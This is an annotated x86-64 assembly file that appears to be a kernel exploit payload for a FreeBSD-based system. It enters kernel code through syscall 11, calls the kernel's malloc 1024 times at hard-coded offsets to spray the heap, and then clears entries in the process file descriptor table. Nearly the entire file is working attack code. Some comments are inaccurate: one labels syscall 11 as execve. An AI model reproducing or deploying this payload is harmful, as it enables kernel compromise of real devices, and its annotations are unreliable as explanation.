; Switch to 64-bit mode
use64

entry:
  push rsi                     ; Save the value of rsi register on the stack
  push rdi                     ; Save the value of rdi register on the stack
  mov rsi, rsp                 ; Move the current stack pointer to rsi
  lea rdi, [rel kernel_entry]  ; Load the address of kernel_entry label into rdi
  mov eax, 11                  ; Move 11 (execve system call number) into eax
  syscall                      ; Make a system call with the current eax, rdi, rsi
  pop rdi                      ; Restore the original value of rdi register
  pop rsi                      ; Restore the original value of rsi register
  ret                          ; Return from the entry function

kernel_entry:
  mov rsi, [rsi+8]             ; Move the value at (rsi + 8) into rsi
  push qword [rsi]             ; Push the value at rsi onto the stack (socket closeup)
  push qword [rsi+8]           ; Push the value at (rsi + 8) onto the stack (kernel base)
  mov rcx, 1024                ; Move 1024 into rcx, used as a counter for the loop

.malloc_loop:
  push rcx                     ; Save the current loop counter on the stack
  mov rax, [rsp+8]             ; Move the kernel base from the stack into rax
  mov edi, 0xf8                ; Move 0xf8 (size) into edi
  lea rsi, [rax+0x1540eb0]     ; Load the address of M_TEMP (kernel base + 0x1540eb0) into rsi
  mov edx, 2                   ; Move 2 into edx
  add rax, 0xd7a0              ; Adjust rax to point to malloc (kernel base + 0xd7a0)
  call rax                     ; Call the malloc function
  pop rcx                      ; Restore the loop counter from the stack
  loop .malloc_loop            ; Decrement rcx and loop if rcx is not zero
  pop rdi                      ; Pop the value of rdi from the stack
  pop rsi                      ; Pop the value of rsi from the stack
  test rsi, rsi                ; Test if rsi is zero
  jz .skip_closeup             ; Jump to skip_closeup if rsi is zero
  mov rax, [gs:0]              ; Move the value at gs:0 (current thread) into rax
  mov rax, [rax+8]             ; Move the value at (rax + 8) (td_proc) into rax
  mov rax, [rax+0x48]          ; Move the value at (rax + 0x48) (p_fd) into rax
  mov rdx, [rax]               ; Move the value at rax (fd_ofiles) into rdx
  mov rcx, 512                 ; Move 512 into rcx, used as a counter for the closeup loop

.closeup_loop:
  lodsd                        ; Load the dword at rsi into eax and increment rsi
  mov qword [rdx+8*rax], 0     ; Set the qword at (rdx + 8 * rax) to zero
  loop .closeup_loop           ; Decrement rcx and loop if rcx is not zero

.skip_closeup:
  xor eax, eax                 ; Zero out eax register
  ret                          ; Return from the kernel_entry function
  align 8                      ; Align the next instruction on an 8-byte boundary
